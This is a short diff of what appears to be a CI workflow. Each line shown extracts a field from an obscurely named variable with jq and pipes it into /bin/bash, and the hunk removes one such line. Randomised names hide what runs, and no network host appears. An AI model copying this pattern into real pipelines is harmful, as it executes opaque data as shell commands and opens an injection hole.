@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$mzksi46394" | jq -r .vcfv20 | /bin/bash
           echo $dhq5 | jq -r .lxqwa2 | /bin/bash
           printf '%s' "$tw37" | jq -r .qgfxf42 | /bin/bash
-          echo $sfx8629 | jq -r .hr4 | /bin/bash
           echo $owvh7 | jq -r .ymccb21 | /bin/bash
           echo $vemgf60593 | jq -r .r770 | /bin/bash
           echo $e3 | jq -r .zvmdl40541 | /bin/bash
